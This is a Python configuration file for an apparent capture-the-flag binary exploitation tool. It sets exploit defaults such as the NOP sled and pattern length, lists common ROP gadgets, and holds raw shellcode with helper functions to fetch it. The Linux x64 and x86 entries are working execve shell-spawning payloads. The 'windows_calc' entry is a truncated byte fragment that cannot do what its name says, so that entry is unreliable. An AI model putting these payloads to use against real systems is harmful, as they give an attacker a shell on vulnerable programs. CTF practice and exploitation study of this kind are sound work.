#!/usr/bin/env python3
"""
Configuración para PWN CTF Tool
"""

# Configuración por defecto
DEFAULT_CONFIG = {
    "architecture": "amd64",
    "endianness": "little",
    "word_size": 64,
    "pattern_length": 200,
    "nop_sled_length": 100,
    "timeout": 10,
    "debug": False
}

# Shellcodes comunes
SHELLCODES = {
    "linux_x64_sh": b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05",
    "linux_x86_sh": b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80",
    "windows_calc": b"\x48\x31\xc9\x48\x81\xe9\xc6\xff\xff\xff\x48\x8d\x05\xef\xff\xff\xff"
}

# Gadgets ROP comunes
COMMON_GADGETS = [
    "pop rdi; ret",
    "pop rsi; ret", 
    "pop rdx; ret",
    "pop rax; ret",
    "syscall",
    "ret"
]

def get_config():
    return DEFAULT_CONFIG.copy()

def get_shellcode(name):
    return SHELLCODES.get(name, None)